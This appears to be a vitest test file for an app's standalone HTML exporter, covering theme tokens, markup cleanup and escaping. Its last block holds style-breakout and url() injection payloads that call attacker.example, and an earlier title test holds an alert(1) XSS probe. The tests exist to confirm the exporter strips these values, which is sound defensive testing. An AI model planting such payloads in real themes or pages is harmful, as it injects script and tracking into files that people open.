import { describe, expect, it } from "vitest";

import { PRESETS } from "../theme/presets";
import { _cleanedMarkup, _escapeHtml, buildStandaloneHtml } from "./html";

const theme = PRESETS[0]!.light;

function article(html: string): HTMLElement {
  const element = document.createElement("article");
  element.className = "doc";
  element.innerHTML = html;
  return element;
}

describe("buildStandaloneHtml", () => {
  it("inlines the theme's tokens so the file needs nothing else", () => {
    const html = buildStandaloneHtml({
      title: "Guide",
      theme,
      article: article("<p>Hello</p>"),
      documentCss: ".doc { color: var(--doc-text); }",
    });

    expect(html).toContain(`--doc-bg: ${theme.colors.bg};`);
    expect(html).toContain(".doc { color: var(--doc-text); }");
    expect(html).toContain("<p>Hello</p>");
  });

  it("carries the page width but never the zoom", () => {
    // The file should be as wide as the page you were looking at. Zoom is a
    // property of this window and means nothing in someone else's browser.
    const html = buildStandaloneHtml({
      title: "Guide",
      theme,
      article: article("<table><tr><td>wide</td></tr></table>"),
      documentCss: "",
      view: { contentWidth: "full", zoom: 2 },
    });

    expect(html).toContain("--doc-page: 100%;");
    expect(html).toContain(`--doc-size: ${theme.typography.baseSize}px;`);
  });

  it("defaults to a standard-width page when no view is given", () => {
    const html = buildStandaloneHtml({
      title: "Guide",
      theme,
      article: article("<p>Hello</p>"),
      documentCss: "",
    });

    expect(html).toContain("--doc-page: var(--doc-measure);");
  });

  it("references no external resource", () => {
    const html = buildStandaloneHtml({
      title: "Guide",
      theme,
      article: article("<p>Hello</p>"),
      documentCss: "",
    });

    // The whole point of the export: opening it offline, on another machine,
    // must look the same. A <link> or a remote @import would break that.
    expect(html).not.toContain("<link");
    expect(html).not.toContain("<script");
    expect(html).not.toMatch(/@import\s+url/);
  });

  it("escapes the title rather than letting it close the tag", () => {
    const html = buildStandaloneHtml({
      title: "</title><script>alert(1)</script>",
      theme,
      article: article(""),
      documentCss: "",
    });
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;/title&gt;");
  });

  it("carries the appearance so the file matches the theme it was exported in", () => {
    const dark = PRESETS[0]!.dark;
    const html = buildStandaloneHtml({
      title: "Guide",
      theme: dark,
      article: article(""),
      documentCss: "",
    });
    expect(html).toContain('data-appearance="dark"');
    expect(html).toContain("color-scheme: dark");
  });
});

describe("cleanedMarkup", () => {
  it("drops the copy buttons, which mean nothing outside the app", () => {
    const element = article(
      `<pre class="code-block"><code>x</code><button class="code-copy">Copy</button></pre>`,
    );
    const markup = _cleanedMarkup(element);
    expect(markup).not.toContain("code-copy");
    expect(markup).toContain("<code>x</code>");
  });

  it("drops the source positions the editor needs and a reader does not", () => {
    const element = article(
      `<h1 data-sourcepos="1:1-1:7">Title</h1><p data-sourcepos="3:1-3:5">Body</p>`,
    );
    const markup = _cleanedMarkup(element);
    // On nearly every element, so leaving them in would bloat the export and
    // describe the shape of a .md file the reader is not shipping.
    expect(markup).not.toContain("data-sourcepos");
    expect(markup).toContain("Title");
    expect(markup).toContain("Body");
  });

  it("keeps rendered diagrams as markup rather than as something to re-run", () => {
    const element = article(
      `<figure class="mermaid" data-rendered="house-light" data-source="graph TD"><svg><g/></svg></figure>`,
    );
    const markup = _cleanedMarkup(element);
    expect(markup).toContain("<svg>");
    expect(markup).not.toContain("data-rendered");
    expect(markup).not.toContain("data-source");
  });

  it("restores a blocked remote image, since the export is a deliberate keep", () => {
    const element = article(
      `<img data-blocked="true" data-original-src="https://example.com/a.png" alt="a">`,
    );
    const markup = _cleanedMarkup(element);
    expect(markup).toContain('src="https://example.com/a.png"');
    expect(markup).not.toContain("data-blocked");
  });

  it("does not mutate the live document it was given", () => {
    const element = article(
      `<pre class="code-block"><code>x</code><button class="code-copy">Copy</button></pre>`,
    );
    _cleanedMarkup(element);
    // The article is still on screen and still interactive after an export.
    expect(element.querySelector(".code-copy")).not.toBeNull();
  });
});

describe("escapeHtml", () => {
  it("escapes the characters that could close a tag or an attribute", () => {
    expect(_escapeHtml(`<a href="x">&`)).toBe("&lt;a href=&quot;x&quot;&gt;&amp;");
  });
});

describe("a hostile theme in the export", () => {
  /**
   * `ThemeSchema` refuses these values now, so this cannot arrive through
   * `parseThemeFile`. The object is built by hand precisely to skip that check:
   * this asserts the exporter is safe on its own, not merely downstream of a
   * validator. The existing tests above only ever exercise `PRESETS[0]`, which is
   * why the hole survived — a preset has nothing hostile in it to find.
   */
  function hostileTheme(value: string) {
    const base = structuredClone(theme);
    base.colors.bg = value;
    return base;
  }

  it("does not let a colour close the style element and open a script", () => {
    const html = buildStandaloneHtml({
      title: "Guide",
      theme: hostileTheme("#fff</style><script>fetch('https://attacker.example')</script>"),
      article: article("<p>Hello</p>"),
      documentCss: "",
    });

    expect(html).not.toContain("<script");
    expect(html).not.toContain("attacker.example");
    // The document itself still exports; one unusable token is dropped, not the file.
    expect(html).toContain("<p>Hello</p>");
  });

  it("drops a token carrying url(), which would fetch when the file is opened", () => {
    const html = buildStandaloneHtml({
      title: "Guide",
      theme: hostileTheme("url(https://attacker.example/pixel.png)"),
      article: article("<p>Hello</p>"),
      documentCss: "",
    });

    expect(html).not.toContain("attacker.example");
  });

  it("keeps every ordinary token", () => {
    const html = buildStandaloneHtml({
      title: "Guide",
      theme,
      article: article("<p>Hello</p>"),
      documentCss: "",
    });

    // A dropped token would silently change how every export looks, so the
    // filter has to be inert for real themes.
    expect(html).toContain("--doc-bg:");
    expect(html).toContain("--doc-text:");
  });
});
